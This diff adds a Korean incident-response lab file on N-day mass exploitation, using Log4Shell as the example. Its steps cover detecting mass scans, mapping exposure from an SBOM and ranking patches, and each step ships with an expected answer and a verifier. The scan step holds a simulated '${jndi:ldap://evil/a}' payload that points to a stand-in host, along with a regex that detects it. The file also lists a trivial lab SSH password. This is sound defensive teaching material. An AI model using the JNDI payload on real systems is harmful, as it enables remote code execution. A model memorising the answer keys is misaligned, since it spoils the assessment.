@@ -1,0 +1,159 @@
+lab_id: agent-ir-adv-week06
+title: "W06 — N-day 대규모 악용: 대량 스캔 탐지·노출 인벤토리·패치 우선순위"
+version: ai
+course: agent-ir-adv
+week: 6
+description: |
+  공개 취약점 시간 싸움. 공개 CVE 경로 대량 스캔 탐지(NDAY_SCAN_DETECTED), 노출 인벤토리(EXPOSURE_MAPPED),
+  노출×악용 패치 우선순위(PRIORITIZED), 종합(Assessment).
+  N-day는 공개 즉시 AI 대량 악용 — 노출 파악+속도가 관건. 모르는 노출이 가장 위험.
+difficulty: hard
+duration_minutes: 150
+audience: 에이전트 IR 심화 (6주차)
+prerequisites:
+  - el34 호스트 접속 (`ssh ccc@{{TARGET_IP}}`, 비밀번호 `1`)
+  - GPU Ollama 도달 — gemma3:4b
+  - bastion API — el34-bastion:9100 (apache/suricata 관찰)
+  - W06 강의안 정독 — §0.5(N-day·노출 인벤토리·우선순위)
+objectives:
+  - "GPU 헬스체크(GEN_OK)"
+  - "공개 CVE 경로 대량 스캔 탐지(NDAY_SCAN_DETECTED)"
+  - "노출 인벤토리(EXPOSURE_MAPPED)"
+  - "노출×악용 패치 우선순위(PRIORITIZED)"
+  - "종합(Assessment)"
+pass_threshold: 0.6
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## STEP 1 — GPU 헬스체크 → GEN_OK
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Reply with the word ready.","stream":false,"options":{"num_predict":10}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
+      ```
+      ✅ 마지막 줄 `GEN_OK`.
+    answer: |
+      ready
+      GEN_OK
+    answer_detail: "GPU 응답 확인."
+    verify:
+      type: output_contains
+      expect: GEN_OK
+      field: stdout
+
+  - order: 2
+    instruction: |
+      ## STEP 2 — 대량 스캔 탐지 → NDAY_SCAN_DETECTED
+      > **🎯 목표:** 공개 CVE 경로를 여러 출처가 동시에 두드리는 대량 스캔 탐지.
+      > **개념:** N-day는 시그니처 있음 — 공개 직후 폭증하는 스캔이 신호.
+      ```bash
+      python3 - <<'PY'
+      # Log4Shell 시그니처가 여러 출처에서(공개 직후 대량 스캔)
+      requests=[{"src":f"185.{i}.x","hdr":"${jndi:ldap://evil/a}"} for i in range(8)] + \
+               [{"src":"10.0.0.5","hdr":"Mozilla/5.0"}]
+      import re
+      log4shell=re.compile(r"\$\{jndi:", re.I)
+      hits={r["src"] for r in requests if log4shell.search(r["hdr"])}
+      print(f"distinct sources sending ${{jndi:}} probes: {len(hits)}")
+      # 여러 출처가 같은 CVE 경로 스캔 = N-day 대량 악용 캠페인
+      print("NDAY_SCAN_DETECTED" if len(hits)>=5 else "ISOLATED")
+      PY
+      ```
+      ✅ 마지막 줄 `NDAY_SCAN_DETECTED` (8개 출처가 Log4Shell ${jndi:} 스캔 = 대량 악용).
+      🔎 공개 직후 여러 출처가 같은 CVE 경로를 두드린다. 시그니처는 있으니 탐지는 쉽다 — 문제는 노출·속도.
+    answer: |
+      distinct sources sending ${jndi:} probes: 8
+      NDAY_SCAN_DETECTED
+    answer_detail: "다출처 공개 CVE 경로 대량 스캔 탐지 → NDAY_SCAN_DETECTED. 공개 직후 캠페인."
+    verify:
+      type: output_contains
+      expect: NDAY_SCAN_DETECTED
+      field: stdout
+
+  - order: 3
+    instruction: |
+      ## STEP 3 — 노출 인벤토리 → EXPOSURE_MAPPED
+      > **🎯 목표:** SBOM으로 취약 컴포넌트를 어디에 쓰는지 파악.
+      > **개념:** 모르면 못 막는다 — 노출 파악이 대응 속도의 전제.
+      ```bash
+      python3 - <<'PY'
+      # SBOM: 서비스별 사용 컴포넌트
+      sbom={"webapp":["log4j-2.14","spring-5.2"], "api":["log4j-2.17-patched","jackson"],
+            "billing":["log4j-2.14","mysql"], "static-site":["nginx"]}
+      VULN="log4j-2.14"   # 취약 버전(2.17 미만)
+      exposed=[svc for svc,comps in sbom.items() if VULN in comps]
+      for svc,comps in sbom.items():
+          vuln = VULN in comps
+          print(f"  {svc:12}: {'VULNERABLE ('+VULN+')' if vuln else 'not vulnerable'}")
+      print("exposed services:", exposed)
+      print("EXPOSURE_MAPPED" if exposed else "NO_EXPOSURE")
+      PY
+      ```
+      ✅ 마지막 줄 `EXPOSURE_MAPPED` (SBOM으로 webapp·billing이 취약 log4j-2.14 사용 파악).
+      🔎 SBOM 없으면 "우리가 취약한지도 모른다". 미리 구성표를 두면 공개 즉시 노출을 안다.
+    answer: |
+      webapp      : VULNERABLE (log4j-2.14)
+      api         : not vulnerable
+      billing     : VULNERABLE (log4j-2.14)
+      static-site : not vulnerable
+      exposed services: ['webapp', 'billing']
+      EXPOSURE_MAPPED
+    answer_detail: "SBOM으로 취약 컴포넌트 사용 서비스 파악 → EXPOSURE_MAPPED. 대응 전제."
+    verify:
+      type: output_contains
+      expect: EXPOSURE_MAPPED
+      field: stdout
+
+  - order: 4
+    instruction: |
+      ## STEP 4 — 패치 우선순위 → PRIORITIZED
+      > **🎯 목표:** 노출×악용×중요도로 패치 순서 결정.
+      > **개념:** 가장 위험한 것부터 — 자원 집중.
+      ```bash
+      python3 - <<'PY'
+      # 각 취약 서비스: 외부노출, 악용중, 중요도
+      services=[{"svc":"webapp","internet_facing":True,"under_attack":True,"criticality":3},
+                {"svc":"billing","internet_facing":False,"under_attack":False,"criticality":5}]
+      def priority(s):
+          return (2 if s["internet_facing"] else 0)+(3 if s["under_attack"] else 0)+s["criticality"]
+      ranked=sorted(services, key=priority, reverse=True)
+      for s in ranked:
+          print(f"  {s['svc']:8} exposed={s['internet_facing']} attacked={s['under_attack']} crit={s['criticality']} -> priority={priority(s)}")
+      # webapp(노출+악용)이 billing(내부·미악용·고중요)보다 우선
+      print("PRIORITIZED" if ranked[0]["svc"]=="webapp" else "CHECK")
+      PY
+      ```
+      ✅ 마지막 줄 `PRIORITIZED` (webapp: 노출+악용중 → 최우선, billing보다 먼저).
+      🔎 billing이 더 중요해도, webapp은 노출+실제 악용 중이라 우선. 지금 뚫리는 것부터 막는다.
+    answer: |
+      webapp   exposed=True attacked=True crit=3 -> priority=8
+      billing  exposed=False attacked=False crit=5 -> priority=5
+      PRIORITIZED
+    answer_detail: "노출×악용×중요도로 패치 우선순위(webapp 최우선) → PRIORITIZED. 자원 집중."
+    verify:
+      type: output_contains
+      expect: PRIORITIZED
+      field: stdout
+
+  - order: 5
+    instruction: |
+      ## STEP 5 — 종합 → Assessment
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Write a short note for W06 on N-day mass exploitation like Log4Shell. Findings: many sources probing the ${jndi:} path were detected as a mass scan (NDAY_SCAN_DETECTED), an SBOM mapped which services use the vulnerable component (EXPOSURE_MAPPED), and patch priority ranked an internet-facing service under active attack first (PRIORITIZED). Explain that disclosure starts a race, unknown exposure is the biggest risk, and defense needs SBOM/exposure inventory plus speed and priority by exposure x exploitation. Start with exactly Assessment on its own line.","stream":false,"options":{"num_predict":330}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
+      ```
+      ✅ 출력에 `Assessment`.
+      🔎 정리: N-day는 공개=경주 시작. 노출 인벤토리+대량 스캔 탐지+우선순위(노출×악용)로 몇 시간 안에 대응.
+      다음 주(W07)는 **Multi-stage 피싱→웹셸→측면이동**.
+    answer: |
+      Assessment
+      N-day disclosure starts a race; the biggest risk is unknown exposure, so an SBOM/exposure inventory is essential.
+      Detect mass scans, then prioritize patching by exposure x exploitation x criticality and act within hours.
+    answer_detail: "W06 N-day 종합(Assessment). 대량 스캔·노출 인벤토리·우선순위."
+    verify:
+      type: output_contains
+      expect: Assessment
+      field: stdout
